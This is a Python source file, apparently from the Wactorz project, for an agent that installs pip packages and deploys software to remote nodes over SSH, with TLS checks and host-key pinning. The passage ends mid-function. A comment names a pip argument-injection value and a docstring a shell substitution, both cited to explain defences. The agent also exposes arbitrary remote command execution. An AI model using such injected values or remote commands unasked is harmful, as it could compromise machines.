"""InstallerAgent — pre-defined agent that installs Python packages on demand.
Always uses sys.executable so packages land in the active venv (e.g. myenv),
not the system Python.
"""

import asyncio
import importlib
import ipaddress
import logging
import shlex
import socket
import subprocess
import sys
import time
from dataclasses import dataclass, replace
from pathlib import Path
from typing import Any

import asyncssh

from .._version import __version__
from ..config import (
    CONFIG,
    NODE_SIGNING,
    DeployTarget,
    deploy_env_prefix,
    deploy_name_error,
    deploy_target,
    deploy_target_for_host,
)
from ..core import broker_accounts
from ..core.actor import Actor, Message, MessageType
from ..core.mqtt import client_id, install_id, mqtt_client
from ..core.mqtt_tls import SYSTEM_TRUST, checks_hostname, generated_ca_path
from ..core.node_signing import next_sequence, node_key
from ..core.paths import resolve_state_dir
from ..core.pip import is_installable_name
from . import node_service
from .lookup import find_main_actor

logger = logging.getLogger(__name__)

#: The control topics main publishes without retaining them, so a retained message
#: on one was put there by something else. `desired_state` is not among them: main
#: retains its own, and republishes it as soon as the node reports that it checks.
UNRETAINED_CONTROL_TOPICS = ("spawn", "stop", "stop_all", "restart", "restart_agent", "migrate")

#: Where ``/deploy`` puts the CA a node verifies the broker with, under ``~/wactorz``.
NODE_CA_FILE = "mqtt-ca.crt"

#: How long the node's TLS check waits for the broker, in seconds.
TLS_CHECK_TIMEOUT_S = 5

#: What a node runs to learn whether the broker answers TLS with the CA it was
#: given. Standard library only: it runs before the node's venv exists, with its own
#: ``python3``. Arguments: host, port, CA (a path or ``system``), whether to check
#: the hostname (``1``/``0``), and the timeout. Exits 1 and prints why on failure.
TLS_CHECK_SCRIPT = """
import socket, ssl, sys
host, port, ca, check, timeout = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], float(sys.argv[5])
try:
    context = ssl.create_default_context() if ca == "system" else ssl.create_default_context(cafile=ca)
    context.check_hostname = check == "1"
    with socket.create_connection((host, port), timeout=timeout) as raw:
        with context.wrap_socket(raw, server_hostname=host):
            pass
except (OSError, ValueError) as exc:
    print(exc)
    sys.exit(1)
"""

#: How long the node's reachability check waits for the broker port, in seconds.
REACH_CHECK_TIMEOUT_S = 5

#: What a node runs to learn whether the broker's port answers at all. Standard
#: library only, for the same reason as the TLS check. Arguments: host, port, and
#: the timeout. Exits 1 and prints why on failure. It answers the question the
#: node's own log answers only after the deploy has reported success: a firewall
#: on the broker's host, or an address the node cannot route to, times out here in
#: seconds rather than retrying there for ever.
REACH_CHECK_SCRIPT = """
import socket, sys
host, port, timeout = sys.argv[1], int(sys.argv[2]), float(sys.argv[3])
try:
    socket.create_connection((host, port), timeout=timeout).close()
except OSError as exc:
    print(exc)
    sys.exit(1)
"""

#: How long the server waits for the broker to accept the node's account, in seconds.
CREDENTIAL_CHECK_TIMEOUT_S = 10

#: How long the deploy waits for the node's first heartbeat, in seconds. Generous
#: rather than tight: a node that installs its packages on first start takes a
#: while before it connects, and the point is to catch a node that never will.
FIRST_HEARTBEAT_TIMEOUT_S = 45

_TLS_MODE_ON = frozenset({"on", "1", "true", "yes"})
_TLS_MODE_OFF = frozenset({"off", "0", "false", "no"})


class UnusableNodeAccountError(ValueError):
    """A node's name cannot be the broker account it would be deployed with."""

    def __init__(self, problem: str) -> None:
        super().__init__(problem)


class UnknownTlsModeError(ValueError):
    """A deploy target's ``BROKER_TLS`` names no mode."""

    def __init__(self, target: DeployTarget) -> None:
        super().__init__(
            f"{deploy_env_prefix(target.name)}_BROKER_TLS is {target.broker_tls!r}: "
            "use on or off, or leave it unset to check from the node."
        )


class NoCaForNodeError(ValueError):
    """A deploy target asks for TLS, and there is no CA to give the node."""

    def __init__(self, target: DeployTarget, source: Path) -> None:
        super().__init__(
            f"{deploy_env_prefix(target.name)}_BROKER_TLS is on, but there is no CA at "
            f"{source} to give the node. Set MQTT_TLS_CA, or start the broker Wactorz "
            "provides once so it issues one."
        )


class BrokerUnreachableFromNodeError(RuntimeError):
    """The node cannot open the broker's port, so a runner started there would never connect."""

    def __init__(self, node_name: str, broker: str, port: int, reason: str) -> None:
        super().__init__(
            f"Node '{node_name}' cannot reach the broker at {broker}:{port}: {reason}. "
            f"Check that the address is the broker as seen from the node "
            f"({deploy_env_prefix(node_name)}_BROKER), and that a firewall on the broker's "
            f"host allows inbound {port} from the node."
        )


class BrokerRefusedNodeAccountError(RuntimeError):
    """The broker will not accept the account the node is about to be given."""

    def __init__(self, node_name: str, username: str, reason: str) -> None:
        shown = username or "(anonymous)"
        super().__init__(
            f"The broker refused the account node '{node_name}' would use ({shown}): {reason}. "
            f"Check MQTT_USERNAME and MQTT_PASSWORD, or the node's own "
            f"{deploy_env_prefix(node_name)}_BROKER_USER and _BROKER_PASSWORD."
        )


@dataclass(frozen=True)
class NodeTls:
    """How ``/deploy`` connects a node to the broker, and why."""

    enabled: bool
    port: int
    #: ``MQTT_TLS_CA`` as the node reads it: the CA's path there, or ``system``.
    ca: str = ""
    check_hostname: bool = False
    note: str = ""


def tls_mode(value: str) -> str | None:
    """``auto``, ``on`` or ``off`` for a ``DEPLOY_<NODE>_BROKER_TLS`` value, or None."""
    setting = value.strip().lower()
    if setting in ("", "auto"):
        return "auto"
    if setting in _TLS_MODE_ON:
        return "on"
    if setting in _TLS_MODE_OFF:
        return "off"
    return None


def reach_check_command(broker: str, port: int) -> str:
    """The shell command that runs :data:`REACH_CHECK_SCRIPT` on the node, every value quoted."""
    return " ".join(
        [
            "python3",
            "-c",
            shlex.quote(REACH_CHECK_SCRIPT),
            shlex.quote(broker),
            str(int(port)),
            str(REACH_CHECK_TIMEOUT_S),
        ]
    )


def tls_check_command(broker: str, tls: NodeTls) -> str:
    """The shell command that runs :data:`TLS_CHECK_SCRIPT` on the node, every value quoted."""
    return " ".join(
        [
            "python3",
            "-c",
            shlex.quote(TLS_CHECK_SCRIPT),
            shlex.quote(broker),
            str(int(tls.port)),
            shlex.quote(tls.ca),
            "1" if tls.check_hostname else "0",
            str(TLS_CHECK_TIMEOUT_S),
        ]
    )


def known_hosts_address(host: str) -> str:
    """``host`` if it is an IP address, otherwise ``""``.

    `asyncssh.match_known_hosts` takes a host *and* an address, and parses the
    address as an IP — a name given there raises `ValueError` before any lookup
    happens. Passing the host for both failed every deploy to a target named
    rather than numbered, `.local` names included, which is what the docs tell
    people to use. Given ``""`` it falls back to the host and tolerates a name,
    which is what is wanted whenever the address is not separately known.
    """
    try:
        ipaddress.ip_address(host)
    except ValueError:
        return ""
    else:
        return host


# pip package name → importable module name


PACKAGE_TO_IMPORT = {
    "opencv-python": "cv2",
    "pillow": "PIL",
    "scikit-learn": "sklearn",
    "beautifulsoup4": "bs4",
    "pymupdf": "fitz",
    "python-docx": "docx",
    "python-pptx": "pptx",
    "pdfplumber": "pdfplumber",
    "httpx": "httpx",
    "requests": "requests",
    "numpy": "numpy",
    "pandas": "pandas",
    "torch": "torch",
    "transformers": "transformers",
    "ultralytics": "ultralytics",
    "pyserial": "serial",
    "duckduckgo-search": "duckduckgo_search",
    "ddgs": "duckduckgo_search",
    "asyncssh": "asyncssh",
    "rich": "rich",
    "tqdm": "tqdm",
    "lxml": "lxml",
    "aiohttp": "aiohttp",
}

# importable module name → pip package name (for when user gives import names)
IMPORT_TO_PACKAGE = {
    "cv2": "opencv-python",
    "PIL": "pillow",
    "sklearn": "scikit-learn",
    "bs4": "beautifulsoup4",
    "fitz": "pymupdf",
    "docx": "python-docx",
    "pptx": "python-pptx",
    "pdfplumber": "pdfplumber",
    "httpx": "httpx",
    "requests": "requests",
    "numpy": "numpy",
    "pandas": "pandas",
    "torch": "torch",
    "transformers": "transformers",
    "ultralytics": "ultralytics",
    "serial": "pyserial",
    "duckduckgo_search": "duckduckgo-search",
    "ddgs": "duckduckgo-search",
    "asyncssh": "asyncssh",
    "rich": "rich",
    "tqdm": "tqdm",
    "lxml": "lxml",
    "aiohttp": "aiohttp",
}


class InstallerAgent(Actor):
    """Pre-defined agent that installs Python packages on demand.
    Uses sys.executable so packages are installed into the active venv.
    """

    def __init__(self, **kwargs):
        kwargs.setdefault("name", "installer")
        super().__init__(**kwargs)
        self.protected = True
        self._install_log: list[dict] = []
        # Serialises the read-then-append on the known-hosts file: two deploys
        # to new hosts at once would otherwise both read "unknown" and race.
        self._known_hosts_lock = asyncio.Lock()
        #: When the current deploy began: a heartbeat older than this belongs to
        #: whatever ran on the node before it.
        self._deploy_started_at = 0.0

    def _current_task_description(self) -> str:
        return "idle"

    async def on_start(self):
        logger.info("[%s] Installer ready — using: %s", self.name, sys.executable)
        self._scrub_persisted_credentials()
        await self._mqtt_publish(
            f"agents/{self.actor_id}/logs",
            {
                "type": "log",
                "message": f"Installer ready ({sys.executable})",
                "timestamp": time.time(),
            },
        )
        await self.publish_manifest(
            description="Installs Python packages on demand via pip",
            capabilities=["pip_install", "package_management"],
        )

    async def handle_message(self, msg: Message):
        if msg.type == MessageType.TASK:
            result = await self._handle_install(msg)
            # Echo task_id back so caller's future can resolve
            if isinstance(msg.payload, dict):
                task_id = msg.payload.get("task") or msg.payload.get("_task_id")
                if task_id:
                    result["task"] = task_id
                    result["_task_id"] = task_id
            target = msg.reply_to or msg.sender_id
            if target:
                await self.send(target, MessageType.RESULT, result)

    async def _handle_install(self, msg: Message) -> dict:
        payload = msg.payload if isinstance(msg.payload, dict) else {}
        action = payload.get("action", "install")

        if action == "install":
            packages = payload.get("packages", [])
            if isinstance(packages, str):
                packages = [p.strip() for p in packages.replace(",", " ").split()]
            return await self._install_packages(packages)

        if action == "check":
            packages = payload.get("packages", [])
            if isinstance(packages, str):
                packages = [p.strip() for p in packages.replace(",", " ").split()]
            return self._check_packages(packages)

        if action == "resolve":
            return self._resolve_imports(payload.get("imports", []))

        if action == "history":
            return {"history": self._install_log[-20:]}

        if action == "node_install":
            # Install packages on a remote node via SSH
            # payload: {host, packages}; SSH auth comes from the deploy target
            return await self._node_install(payload)

        if action == "node_deploy":
            # Full bootstrap: install wactorz on the node + start it as one
            # payload: {host, node_name, broker}; SSH auth comes from the deploy target
            return await self._node_deploy(payload)

        if action == "node_install_for_agent":
            # Install packages needed by a specific agent on its remote node
            # payload: {host, packages, agent_name}; SSH auth comes from the deploy target
            return await self._node_install(payload)

        if action == "node_run":
            # Run an arbitrary command on a remote node via SSH
            # payload: {host, command}; SSH auth comes from the deploy target
            return await self._node_run(payload)

        return {"error": f"Unknown action: {action}"}

    # ── Core install logic ──────────────────────────────────────────────────

    async def _install_packages(self, packages: list[str]) -> dict:
        if not packages:
            return {"error": "No packages specified"}

        results = {}
        failed = []

        for pkg in packages:
            pkg = pkg.strip()
            if not pkg:
                continue

            # Resolve import name → pip name (e.g. "cv2" → "opencv-python")
            pip_name = IMPORT_TO_PACKAGE.get(pkg, pkg)

            # No shell here — the command is a list — but pip reads its own
            # options from positional arguments, so `--index-url=http://…` is
            # honoured as configuration rather than treated as a name.
            if not is_installable_name(pip_name):
                logger.warning("[%s] Refusing to install %r — not a package name", self.name, pkg)
                results[pkg] = "refused"
                failed.append(pkg)
                continue

            # Check if already importable (invalidate cache so fresh installs show up)
            import_name = PACKAGE_TO_IMPORT.get(pip_name, pip_name)
            if self._is_installed(import_name):
                logger.info("[%s] %s already installed.", self.name, pip_name)
                results[pip_name] = "already_installed"
                continue

            logger.info("[%s] Installing %s into %s...", self.name, pip_name, sys.executable)
            await self._mqtt_publish(
                f"agents/{self.actor_id}/logs",
                {"type": "log", "message": f"Installing {pip_name}...", "timestamp": time.time()},
            )

            success, output = await self._pip_install(pip_name)

            # duckduckgo-search was renamed to ddgs in v9 — try the other name as fallback
            if not success and pip_name in ("duckduckgo-search", "ddgs"):
                alt = "ddgs" if pip_name == "duckduckgo-search" else "duckduckgo-search"
                logger.info("[%s] Trying alternative name: %s", self.name, alt)
                success, output = await self._pip_install(alt)
                if success:
                    pip_name = alt

            # pdfplumber sometimes fails on Windows — try pymupdf (fitz) as fallback
            if not success and pip_name == "pdfplumber":
                logger.info("[%s] pdfplumber failed, trying pymupdf as fallback...", self.name)
                success, output = await self._pip_install("pymupdf")
                if success:
                    pip_name = "pymupdf"

            results[pip_name] = "installed" if success else f"failed: {output[-300:]}"
            if not success:
                failed.append(pip_name)

            self._install_log.append(
                {
                    "package": pip_name,
                    "success": success,
                    "timestamp": time.time(),
                    "output": output[-500:],
                }
            )

            if success:
                status = f"✓ {pip_name} installed"
            else:
                # Show the actual pip error so failures are diagnosable
                err_snippet = output[-400:].strip().replace("\n", " | ")
                status = f"✗ {pip_name} FAILED: {err_snippet}"
            logger.info("[%s] %s", self.name, status)
            await self._mqtt_publish(
                f"agents/{self.actor_id}/logs",
                {"type": "log", "message": status, "timestamp": time.time()},
            )

        return {
            "results": results,
            "failed": failed,
            "success": len(failed) == 0,
            "message": f"Installed {len(results) - len(failed)}/{len(results)} packages",
        }

    async def _pip_install(self, package: str) -> tuple[bool, str]:
        """Run pip install using the same interpreter that launched this process.

        sys.executable inside a venv points to  venv/Scripts/python.exe  (Windows)
        or  venv/bin/python  (Linux/Mac), so packages always land in the right place.

        Uses subprocess.run() in a thread executor instead of asyncio.create_subprocess_exec()
        because asyncio subprocesses are unreliable on Windows with SelectorEventLoop
        (the default in some Python versions / environments). subprocess.run() works
        correctly on all platforms.
        """
        cmd = [sys.executable, "-m", "pip", "install", package, "--quiet"]
        if sys.platform != "win32":
            cmd.append("--break-system-packages")

        def _run_pip() -> tuple[bool, str]:
            try:
                result = subprocess.run(  # noqa: S603  # argv, no shell; name pre-screened
                    cmd,
                    capture_output=True,
                    timeout=180,
                )
                output = (result.stdout + result.stderr).decode("utf-8", errors="replace")
                return result.returncode == 0, output
            except subprocess.TimeoutExpired:
                return False, "pip timed out after 180s"
            except FileNotFoundError:
                return False, f"Python executable not found: {sys.executable}"
            except Exception as e:
                return False, f"{type(e).__name__}: {e}"

        try:
            loop = asyncio.get_event_loop()
            success, output = await loop.run_in_executor(None, _run_pip)

            if success:
                # Refresh import machinery so the new package is visible immediately
                importlib.invalidate_caches()

            return success, output

        except Exception as e:
            return False, f"Executor error: {type(e).__name__}: {e}"

    def _is_installed(self, import_name: str) -> bool:
        """Check importability, always refreshing the import cache first."""
        importlib.invalidate_caches()
        try:
            importlib.import_module(import_name)
            return True
        except ImportError:
            return False

    # ── Helper actions ──────────────────────────────────────────────────────

    def _check_packages(self, packages: list[str]) -> dict:
        status = {}
        for pkg in packages:
            pip_name = IMPORT_TO_PACKAGE.get(pkg, pkg)
            import_name = PACKAGE_TO_IMPORT.get(pip_name, pip_name)
            status[pkg] = "installed" if self._is_installed(import_name) else "missing"
        return {"status": status}

    def _resolve_imports(self, imports: list[str]) -> dict:
        return {"resolved": {imp: IMPORT_TO_PACKAGE.get(imp, imp) for imp in imports}}

    # ── Remote node helpers (SSH via asyncssh) ──────────────────────────────

    def _resolve_ssh_target(self, payload: dict) -> DeployTarget | None:
        """The configured deploy target a payload refers to, by node name or host.

        ``node_install`` and ``node_run`` are handed a host rather than a node
        name, so a host match is the fallback — otherwise every follow-up call
        to an already-deployed node would have to repeat its credentials.
        """
        node_name = payload.get("node_name") or payload.get("node")
        target = deploy_target(str(node_name)) if node_name else None
        if target is None:
            target = deploy_target_for_host(str(payload.get("host") or ""))
        return target

    async def _resolve_target_host(self, target: DeployTarget, requested: str) -> str:
        """The address to connect to — the target's, never the payload's.

        Resolving credentials from configuration is not enough on its own: a
        payload that names a configured node but a *different* host would have
        sent that node's password to a machine of the caller's choosing. The
        configured host wins, and a payload that disagrees is refused rather
        than quietly ignored, because a mismatch means the caller believed it
        was talking to somewhere else.

        A target with no host is the deliberate "find it by name" case, and the
        lookup happens here rather than being taken on trust from the payload —
        a single mDNS query for one host, resolved by the component that is
        about to authenticate to it.
        """
        if target.host:
            if requested and requested.strip().lower() != target.host.strip().lower():
                raise PermissionError(
                    f"Refusing to connect: deploy target '{target.name}' is configured "
                    f"as {target.host}, but the task asked for {requested}. Credentials "
                    f"are bound to the configured host."
                )
            return target.host

        mdns = f"{target.name}.local"
        try:
            return await asyncio.to_thread(socket.gethostbyname, mdns)
        except OSError as exc:
            raise PermissionError(
                f"Deploy target '{target.name}' has no host configured and "
                f"'{mdns}' does not resolve. Set {deploy_env_prefix(target.name)}_HOST."
            ) from exc

    def _known_hosts_path(self) -> Path:
        """Where learned SSH host keys live.

        Follows ``WACTORZ_STATE_DIR`` unless ``DEPLOY_KNOWN_HOSTS`` pins it, so
        the add-on's ``/data/state`` keeps them across updates — a known-hosts
        file that resets on every restart cannot detect a key change.
        """
        configured = CONFIG.deploy_known_hosts
        if configured:
            return Path(configured).expanduser()
        return Path(resolve_state_dir()) / "known_hosts"

    async def _known_hosts(self, host: str, port: int) -> str:
        """Return the known-hosts path to verify ``host`` against, learning its key first.

        Every SSH connection used to pass ``known_hosts=None``, which accepts
        whatever key answers — so anything that could win the race for the
        target's address on a LAN collected the SSH credentials.

        Verification is now on. A host we have never seen has its key fetched
        (``get_server_host_key`` does not authenticate, so no credential is at
        risk) and recorded — trust on first use, as ssh(1) does interactively. A
        host we *have* seen is never re-learned: the entry already there is what
        asyncssh checks against, so a changed key fails the connection, which is
        the case worth failing on. ``DEPLOY_STRICT_HOST_KEYS=1`` drops the
        first-use step and requires the entry to be there already.
        """
        path = self._known_hosts_path()
        async with self._known_hosts_lock:
            try:
                known = asyncssh.match_known_hosts(
                    str(path), host, known_hosts_address(host), port
                )[0]
            except FileNotFoundError:
                known = []
            if known:
                return str(path)

            if CONFIG.deploy_strict_host_keys:
                raise PermissionError(
                    f"Host key for {host}:{port} is not in {path} and "
                    f"DEPLOY_STRICT_HOST_KEYS is set. Add the key with "
                    f"`ssh-keyscan -p {port} {host} >> {path}` after verifying it."
                )

            key = await asyncssh.get_server_host_key(host, port)
            if key is None:
                raise PermissionError(f"{host}:{port} offered no SSH host key.")
            entry = host if port == 22 else f"[{host}]:{port}"
            line = f"{entry} {key.export_public_key('openssh').decode().strip()}\n"
            path.parent.mkdir(parents=True, exist_ok=True)
            with open(path, "a", encoding="utf-8") as fh:
                fh.write(line)
            # 0600: the file is the only record of which key we trust, so a
            # writable-by-others copy would undo the check it exists to make.
            path.chmod(0o600)
            self._log_remote(
                f"Learned SSH host key for {entry} ({key.get_fingerprint()}) — recorded in {path}"
            )
            return str(path)

    async def _put_node_env(
        self,
        sftp: Any,
        target: DeployTarget,
        home: str,
        node_name: str,
        broker: str,
        port: int,
        tls: NodeTls | None = None,
    ) -> bool:
        """Write ``<home>/wactorz/.env``, mode 0600. Returns whether it holds credentials.

        ``home`` is the node's own answer for the deploy user's home directory,
        not ``/home/<user>``. The two differ for root, whose home is ``/root``,
        and wherever homes are not laid out under ``/home``.

        The file is always written, because it carries the node's identity as
        well as its broker account, and the systemd unit reads every argument
        from it. "Written" and "holds credentials" are therefore different
        answers: an anonymous broker still needs the file, but saying
        credentials went with it would be a lie.

        ``--port`` has no environment fallback in the runner's parser, unlike
        ``--broker`` and ``--name``, so ``WACTORZ_PORT`` has to be written
        rather than assumed — an unset one expands to an empty argument and
        argparse exits 2.

        Two parsers read this file: a shell sources it on the ``nohup`` path,
        and systemd reads it as an ``EnvironmentFile`` under a unit.
        ``shlex.quote`` is the safe intersection — systemd accepts
        single-quoted values and performs no command substitution — so a value
        that is safe to source is also taken literally by systemd. A hand-edited
        ``VAR=$(cmd)`` would not be: the shell runs it, systemd does not.

        A node's own ``DEPLOY_<NODE>_BROKER_USER``/``_PASSWORD`` win; otherwise
        it gets the server's. That default is the usable one — a single broker
        with one account is the common deployment — but it does mean **a stolen
        edge device holds full broker access**, and the broker carries the code
        spawned agents run. Per-node accounts are the answer when that matters;
        ``password_file`` holds as many users as you like.

        This is the out-of-band channel the broker credentials must travel by:
        sending them over the broker itself would publish the very secret that
        protects it, to a channel that is unauthenticated until they arrive.

        The node's signing key travels the same way, with the sequence number main
        has reached and what to do with a control message not signed for it
        (``WACTORZ_NODE_SIGNING``). See ``core/node_signing.py``.

        A node on TLS gets its settings spelled out -- the CA's path, and whether the
        hostname is checked -- rather than left to the defaults of
        ``core/mqtt_tls.py``, which name the server's state directory, not the
        node's.
        """
        username, password = self._node_account(target, node_name)
        lines = [
            f"WACTORZ_NODE={shlex.quote(node_name)}",
            f"WACTORZ_BROKER={shlex.quote(broker)}",
            f"WACTORZ_PORT={shlex.quote(str(port))}",
            f"WACTORZ_NODE_KEY={shlex.quote(node_key(node_name))}",
            f"WACTORZ_CONTROL_SINCE={next_sequence()}",
            f"WACTORZ_NODE_SIGNING={shlex.quote(NODE_SIGNING)}",
        ]
        if tls is not None and tls.enabled:
            lines.append("MQTT_TLS=1")
            lines.append(f"MQTT_TLS_CA={shlex.quote(tls.ca)}")
            lines.append(f"MQTT_TLS_CHECK_HOSTNAME={1 if tls.check_hostname else 0}")
        credentials = bool(username or password)
        if credentials:
            lines.append(f"MQTT_USERNAME={shlex.quote(username)}")
            lines.append(f"MQTT_PASSWORD={shlex.quote(password)}")

        body = "\n".join(lines) + "\n"
        remote = f"{home}/wactorz/.env"
        async with sftp.open(remote, "w") as handle:
            await handle.write(body)
        # After writing, not before: SFTP creates with the umask, so there is a
        # window either way, but a file that is never widened is better than one
        # created world-readable and tightened later.
        await sftp.chmod(remote, 0o600)
        return credentials

    async def _clear_planted_control(self, node_name: str) -> None:
        """Clear whatever is retained on this node's control topics, before it starts.

        A node acts on what it finds on those topics the moment it subscribes, and a
        spawn carries code. Main never retains them, so anything retained there came
        from somewhere else -- and a broker account can write the topics of a name
        that is not a node yet, which no access list can name in advance.

        The clears are unsigned, as an empty payload always is; they instruct nothing,
        and a node ignores them.
        """
        for leaf in UNRETAINED_CONTROL_TOPICS:
            await self._mqtt_publish(f"nodes/{node_name}/{leaf}", b"", retain=True, qos=1)

    @staticmethod
    def _node_account(target: DeployTarget, node_name: str) -> tuple[str, str]:
        """The broker account a node presents: one of its own, a derived one, or the server's.

        A derived account only where the broker has one -- the brokers Wactorz
        configures, with `WACTORZ_NODE_ACCOUNTS` set -- because an account no broker
        knows leaves the node authenticating against nothing. Anywhere else the
        server's own account stays the default, as it has been. A `broker_user` or
        `broker_password` set for the target wins over both.
        """
        default_user, default_password = CONFIG.mqtt_username or "", CONFIG.mqtt_password or ""
        if CONFIG.node_accounts:
            problem = broker_accounts.name_error(node_name)
            if problem:
                raise UnusableNodeAccountError(problem)
            default_user = node_name
            default_password = broker_accounts.password(node_name)
        return target.broker_user or default_user, target.broker_password or default_password

    async def _decide_node_tls(
        self, conn: Any, sftp: Any, target: DeployTarget, home: str, broker: str, plain_port: int
    ) -> NodeTls:
        """Whether this node reaches the broker over TLS, handing it the CA if so.

        The node is given the CA this server trusts (``MQTT_TLS_CA``): the one this
        install generated, one of your own, or none for ``system``. Then it checks
        from the node itself -- the only place the answer is true -- that the broker
        answers TLS on the target's TLS port with that CA. Unless the target says
        otherwise, a node whose check fails keeps plain MQTT on its usual port, so a
        redeploy never strands a node on a broker that serves no TLS.

        ``DEPLOY_<NODE>_BROKER_TLS=on`` gives the node TLS even when the check
        fails (the broker may not be up yet) and fails the deploy when there is no
        CA to hand over; ``off`` skips all of it.
        """
        mode = tls_mode(target.broker_tls)
        if mode is None:
            raise UnknownTlsModeError(target)
        plain = NodeTls(enabled=False, port=plain_port)
        if mode == "off":
            return replace(plain, note="TLS is off for this node.")

        setting = CONFIG.mqtt_tls_ca.strip()
        check = checks_hostname(setting, CONFIG.mqtt_tls_check_hostname)
        if setting.lower() == SYSTEM_TRUST:
            ca = SYSTEM_TRUST
        else:
            source = Path(setting).expanduser() if setting else generated_ca_path()
            if not source.is_file():
                if mode == "on":
                    raise NoCaForNodeError(target, source)
                return replace(plain, note=f"No CA at {source} to give it.")
            ca = f"{home}/wactorz/{NODE_CA_FILE}"
            await sftp.put(str(source), ca)

        tls = NodeTls(enabled=True, port=target.broker_tls_port, ca=ca, check_hostname=check)
        ok, output = await self._ssh_run(conn, tls_check_command(broker, tls))
        if ok:
            return replace(tls, note=f"The broker answered TLS on port {tls.port}.")
        reason = (output.splitlines() or ["no answer"])[-1][:200]
        if mode == "on":
            return replace(
                tls, note=f"TLS is on for this node, though the broker did not answer it: {reason}"
            )
        return replace(
            plain, note=f"The broker did not answer TLS on port {tls.port} from the node: {reason}"
        )

    async def _ssh_kwargs(self, payload: dict) -> dict:
        """Build asyncssh connection kwargs for a task payload.

        Credentials come from the configured deploy target and from nowhere
        else. They used to be read out of the payload — which is message data,
        so a chat line or an LLM-authored task could name a host and hand it a
        password — and, failing that, out of ``_node_credentials`` in the
        agent's persisted state, where the password sat in plaintext.
        """
        requested = str(payload.get("host") or "")
        target = self._resolve_ssh_target(payload)
        if target is None:
            raise PermissionError(
                f"No deploy target configured for '{requested}'. "
                f"SSH credentials come from the environment (DEPLOY_TARGETS plus a "
                f"DEPLOY_<NODE>_* block), not from the task payload."
            )
        host = await self._resolve_target_host(target, requested)
        if not target.key_path and not target.password:
            raise PermissionError(
                f"Deploy target '{target.name}' has no credentials. Set "
                f"{deploy_env_prefix(target.name)}_KEY (preferred) or "
                f"{deploy_env_prefix(target.name)}_PASSWORD."
            )

        kwargs: dict = {
            "host": host,
            "port": target.ssh_port,
            "username": target.user,
            "known_hosts": await self._known_hosts(host, target.ssh_port),
        }
        if target.key_path:
            kwargs["client_keys"] = [target.key_path]
        if target.password:
            kwargs["password"] = target.password
        return kwargs

    def _persist_node_info(self, node_name: str, host: str, user: str) -> None:
        """Remember where a deployed node lives — host and user, never a secret.

        This used to store the SSH password alongside them so later connections
        could reuse it, which put a live credential into the kv store (and into
        every backup and reset dump of it). Credentials are resolved from the
        environment at connect time instead, so there is nothing here worth
        stealing.
        """
        nodes = self.recall("_node_credentials") or {}
        nodes[node_name] = {"host": host, "user": user}
        self.persist("_node_credentials", nodes)
        # Kept for backward compat with _spawn_remote's lookups.
        self.persist(f"node_host_{node_name}", host)
        self.persist(f"node_user_{node_name}", user)
        logger.info("[%s] Recorded node '%s' at %s@%s", self.name, node_name, user, host)

    def _scrub_persisted_credentials(self) -> None:
        """Drop passwords and key paths written by earlier versions.

        Upgrading is what removes the secret: nothing reads these fields any
        more, so leaving them would keep a plaintext password in the kv store
        for the life of the install.
        """
        nodes = self.recall("_node_credentials") or {}
        cleaned = {
            name: {"host": rec.get("host", ""), "user": rec.get("user", "pi")}
            for name, rec in nodes.items()
            if isinstance(rec, dict)
        }
        if cleaned != nodes:
            self.persist("_node_credentials", cleaned)
            logger.info(
                "[%s] Removed stored SSH credentials for %s node(s) — credentials now come from the environment",
                self.name,
                len(cleaned),
            )

    async def _ssh_run(self, conn, command: str) -> tuple[bool, str]:
        """Run a single command over an open SSH connection. Returns (ok, output)."""
        result = await conn.run(command, check=False)
        output = (result.stdout or "") + (result.stderr or "")
        return result.exit_status == 0, output.strip()

    async def _install_wactorz(self, conn: Any, node_name: str, home: str) -> bool:
        """Put this exact version of wactorz into the node's venv.

        Pinned to the version main is running, and deliberately: the two
        exchange spawn configs, manifests and signed control messages, and a
        node a release apart from main is the kind of mismatch that surfaces as
        an agent that will not start, days later.

        From PyPI first, which is the ordinary case. A checkout running an
        unreleased version has nothing to install from there, so the wheel is
        built here and uploaded instead -- which is also the route for a node
        that cannot reach PyPI.
        """
        # Absolute, from the home the node reported, never `~`: SFTP does no
        # tilde expansion, so an upload to `~/wactorz/…` creates a directory
        # literally named `~`; and `shlex.quote` would stop a shell expanding
        # one anyway, since a quoted tilde is just a character.
        pip = shlex.quote(f"{home}/wactorz/venv/bin/pip")

        # A checkout deploys itself. Running from a source tree means the code
        # that matters is here, not on PyPI -- and at the same version number
        # pip would find the node already satisfied and change nothing, so a
        # deploy of edited code silently shipped the previous one.
        wheel = await self._build_wheel()
        if wheel is not None:
            return await self._install_wheel(conn, node_name, home, pip, wheel)

        spec = f"wactorz=={__version__}"
        self._log_remote(f"[{node_name}] Installing {spec} into the venv...")
        ok, out = await self._ssh_run(conn, f"{pip} install {shlex.quote(spec)} -q 2>&1")
        if ok and await self._can_run_as_node(conn, home):
            self._log_remote(f"[{node_name}] {spec} installed from PyPI.")
            return True

        why = (
            f"The published {spec} cannot run as a node."
            if ok
            else f"{spec} could not be installed from PyPI ({out[-160:]})."
        )
        self._log_remote(
            f"[{node_name}] {why} There is no source tree beside this install to build "
            f"a wheel from, so there is nothing else to try."
        )
        return False

    async def _install_wheel(
        self, conn: Any, node_name: str, home: str, pip: str, wheel: Path
    ) -> bool:
        """Put a wheel built here onto the node, and check it can be a node."""
        self._log_remote(f"[{node_name}] Installing {wheel.name} built from this checkout...")
        remote_wheel = f"{home}/wactorz/{wheel.name}"
        async with conn.start_sftp_client() as sftp:
            await sftp.put(str(wheel), remote_wheel)
        # Twice, and the second time forced with `--no-deps`. Two pip behaviours
        # meet here and neither can be worked around by one call.
        #
        # It refuses a wheel whose version is already installed -- "already
        # installed with the same version as the provided wheel" -- and leaves
        # the old code in place, which is the very code this path exists to
        # replace. So the install has to be forced.
        #
        # But `--force-reinstall` alone reinstalls every *dependency* too, healthy
        # or not. On a node with no route to PyPI -- one of the reasons this path
        # exists -- that turns a deploy that would have worked into "Could not
        # find a version that satisfies the requirement aiomqtt", because it
        # tears down a satisfied dependency it then cannot replace. Where there
        # is a route, it still re-fetches and rewrites a dozen packages onto an
        # SD card on every deploy.
        #
        # So: one ordinary call to settle the dependencies, and one forced call
        # that touches nothing but us.
        quoted = shlex.quote(remote_wheel)
        ok, out = await self._ssh_run(conn, f"{pip} install {quoted} -q 2>&1")
        if ok:
            ok, out = await self._ssh_run(
                conn, f"{pip} install --force-reinstall --no-deps {quoted} -q 2>&1"
            )
        if not ok:
            self._log_remote(f"[{node_name}] Installing {wheel.name} failed: {out[-300:]}")
            return False
        if not await self._can_run_as_node(conn, home):
            self._log_remote(
